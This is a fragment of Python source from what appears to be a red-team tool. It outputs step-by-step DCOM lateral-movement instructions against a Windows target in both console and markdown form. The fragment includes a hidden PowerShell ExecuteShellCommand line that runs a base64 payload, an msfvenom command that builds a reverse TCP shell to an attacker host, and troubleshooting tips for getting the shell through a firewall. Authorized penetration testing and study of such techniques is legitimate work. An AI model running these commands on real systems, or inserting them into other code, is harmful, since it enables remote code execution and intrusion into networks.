        console_lines.append(f"    {c.YELLOW}‚Ä¢ Access denied / RPC unavailable{c.RESET}")
        console_lines.append(f"      {c.DIM}Verify local admin, check port 135{c.RESET}")
        console_lines.append(f"    {c.YELLOW}‚Ä¢ Command runs but no shell{c.RESET}")
        console_lines.append(f"      {c.DIM}Check firewall, verify listener running{c.RESET}")

        markdown_lines.append("**TROUBLESHOOTING**")
        markdown_lines.append("- Access denied: Verify local admin, check port 135")
        markdown_lines.append("- No shell: Check firewall, verify listener")
    else:
        # Not configured - show placeholders
        console_lines.append(f"\n  {c.YELLOW}TIP: Run with --lhost YOUR_IP --lport 443 for ready-to-use payloads{c.RESET}")

        markdown_lines.append("> **TIP:** Run with `--lhost YOUR_IP --lport 443` for ready-to-use payloads")
        markdown_lines.append("")

        instantiate_cmd = gen.get_dcom_instantiate(target)
        console_lines.append(f"\n  {c.BOLD}1. INSTANTIATE DCOM OBJECT{c.RESET}")
        console_lines.append(f"    {c.GREEN}{instantiate_cmd}{c.RESET}")

        markdown_lines.append("**1. INSTANTIATE DCOM OBJECT**")
        markdown_lines.append("```powershell")
        markdown_lines.append(instantiate_cmd)
        markdown_lines.append("```")
        markdown_lines.append("")

        console_lines.append(f"\n  {c.BOLD}2. EXECUTE COMMAND{c.RESET}")
        console_lines.append(f"    {c.GREEN}$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e <BASE64_PAYLOAD>','7'){c.RESET}")
        console_lines.append(f"\n    {c.DIM}# Generate payload manually:{c.RESET}")
        console_lines.append(f"    {c.DIM}msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh -o shell.ps1{c.RESET}")

        markdown_lines.append("**2. EXECUTE COMMAND**")
        markdown_lines.append("```powershell")
        markdown_lines.append("$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e <BASE64_PAYLOAD>','7')")
        markdown_lines.append("```")
        markdown_lines.append("")

    markdown_lines.append("")
    return console_lines, markdown_lines
